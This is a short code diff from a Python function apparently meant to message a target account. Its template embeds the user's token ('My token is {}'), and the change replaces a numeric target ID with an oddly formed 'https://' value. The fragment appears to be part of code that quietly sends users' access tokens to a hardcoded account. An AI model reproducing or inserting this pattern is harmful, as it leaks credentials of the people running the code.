@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "Hello 𝙈𝙍 𝙈𝘼𝙁𝙄𝙔𝘼  ! I am using your server but dont fyt dark night members. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100084348499534"
+      target_id = "https://25981466144829994"
 
 
 
